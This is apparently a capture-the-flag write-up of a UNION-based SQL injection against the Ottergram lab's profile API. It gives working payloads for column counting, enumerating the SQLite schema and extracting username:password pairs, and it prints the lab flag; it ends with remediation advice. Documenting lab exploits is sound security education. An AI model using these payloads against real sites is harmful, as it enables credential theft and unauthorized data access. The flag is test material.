# Ottergram — ottergram-004 — SQL Injection.

## Challenge Overview

- **Challenge Name:** Ottergram
- **Lab Variant:** ottergram-004
- **Category:** SQL Injection
- **Difficulty:** As indicated by the challenge platform
- **Target:** `https://lab-1792509298805-6k1lsv.labs-app.bugforge.io`
- **Objective:** Identify and exploit a SQL injection vulnerability to retrieve the challenge flag.

## 1. Initial Reconnaissance

I registered a test user and explored the Ottergram home feed. When viewing another user's profile, I observed a request to:

```http
GET /api/profile/otter_lover
```

The endpoint returned a JSON response containing the user's profile details and associated posts.

The response included fields such as:

- User ID
- Username
- Email
- Full name
- Biography
- Profile picture
- Role
- Associated posts

This endpoint became the primary target for further testing.

## 2. Testing for SQL Injection

I began by manipulating the username path parameter.

An initial test used the following payload:

```sql
' OR '1'='1' -- -
```

The application returned the normal profile. Subsequent tests using a quote and a false Boolean condition returned:

```json
{
  "error": "User not found"
}
```

These results were inconclusive, so I continued testing the query structure.

## 3. Determining the Number of Columns

I used `ORDER BY` payloads to test the number of positions accepted by the underlying SQL query.

Example payloads:

```sql
' ORDER BY 7 -- -
```

```sql
' ORDER BY 8 -- -
```

The seventh position returned HTTP 200 with the normal profile, while the eighth produced HTTP 404 with a `User not found` response.

This suggested that the query supported seven positions. Although the application masked the error, the difference in responses provided a useful lead.

## 4. Confirming UNION-Based SQL Injection

I tested whether a `UNION SELECT` expression could inject a controlled row into the query.

Payload:

```sql
' UNION SELECT 1,2,3,4,5,6,7 -- -
```

The response contained the injected values:

```json
{
  "user": {
    "id": 1,
    "username": 2,
    "email": 3,
    "full_name": 4,
    "bio": 5,
    "profile_picture": 6,
    "role": 7
  }
}
```

This confirmed that the endpoint was vulnerable to UNION-based SQL injection.

The response also revealed the mapping of the seven returned positions to the profile fields.

## 5. Identifying the Database

I queried SQLite's schema catalog to enumerate the available tables.

Payload:

```sql
' UNION SELECT GROUP_CONCAT(name),2,3,4,5,6,7
FROM sqlite_master
WHERE type='table' -- -
```

The response returned:

```text
users,sqlite_sequence,posts,likes,comments
```

This identified SQLite as the database engine and revealed the following tables:

| Table | Purpose |
|---|---|
| `users` | User accounts and profile information |
| `sqlite_sequence` | Tracks generated IDs for applicable autoincrement tables |
| `posts` | Feed posts |
| `likes` | Post likes |
| `comments` | Post comments |

## 6. Enumerating the Users Table Schema

I queried the table definition stored in `sqlite_master`.

Payload:

```sql
' UNION SELECT sql,2,3,4,5,6,7
FROM sqlite_master
WHERE type='table' AND name='users' -- -
```

The response revealed the following schema:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    full_name TEXT,
    bio TEXT,
    profile_picture TEXT,
    role TEXT DEFAULT 'user',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```

The `password` column was particularly relevant because it stored account password values.

## 7. Extracting User Records

I first confirmed that the `admin` account existed by querying the usernames.

Payload:

```sql
' UNION SELECT username,2,3,4,5,6,7 FROM users -- -
```

The response identified the username:

```text
admin
```

I then used SQLite's `GROUP_CONCAT` function to retrieve usernames alongside their password values.

Payload used in the challenge:

```sql
' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password)),
2,3,4,5,6,7 FROM users -- -
```

The application returned a concatenated list of account records. The output contained bcrypt-style hashes for several users and a plaintext value in the admin account's password field.

The admin password field contained the challenge flag.

**Note:** SQLite does not provide MySQL's `CONCAT()` function by default. Since the recorded request succeeded, the exact behavior should be verified against the challenge environment before treating this expression as portable SQLite syntax. SQLite's string concatenation operator is `||`.

## 8. Challenge Flag

```text
bug{3mVmYD3kTkNrFwUNfp7tfjyJyKhwkauX}
```

The flag was recovered from the admin account's password field through the SQL injection vulnerability.

## 9. Vulnerability Analysis

### Root Cause

The profile endpoint appears to incorporate user-controlled input into a SQL query without appropriate parameter binding.

This allowed the injected input to alter the query structure and append a `UNION SELECT` expression.

### Impact

The vulnerability allowed:

- Enumeration of database tables.
- Inspection of table schemas.
- Retrieval of user records.
- Exposure of password values and challenge data.
- Unauthorized access to information outside the requested profile.

### Recommended Remediation

1. **Use parameterized queries.** Bind the username as a query parameter instead of concatenating it into SQL.
2. **Apply least privilege.** Give the application database account only the permissions it requires.
3. **Protect credentials.** Store passwords using an appropriate password-hashing algorithm and never store plaintext passwords.
4. **Handle errors safely.** Return consistent client-facing errors while logging detailed database errors securely on the server.
5. **Add regression tests.** Test profile lookups with quotes, SQL operators, comments, and UNION-style input to ensure that user input remains data rather than executable SQL.

## 10. Lessons Learned

This challenge demonstrated a practical SQL injection investigation:

1. Identify an endpoint that accepts user-controlled input.
2. Compare normal and manipulated responses.
3. Test query structure with `ORDER BY`.
4. Confirm injection using `UNION SELECT`.
5. Enumerate the database schema.
6. Identify relevant tables and columns.
7. Retrieve the intended challenge artifact.
8. Document the impact and recommended fixes.

## Conclusion

The Ottergram challenge was solved by exploiting a UNION-based SQL injection vulnerability in the profile API. The injection exposed SQLite schema metadata and user records, ultimately revealing the flag in the admin account's password field.

The primary defensive lesson is to use parameterized SQL queries and ensure that sensitive account data is never exposed through user-controlled database queries.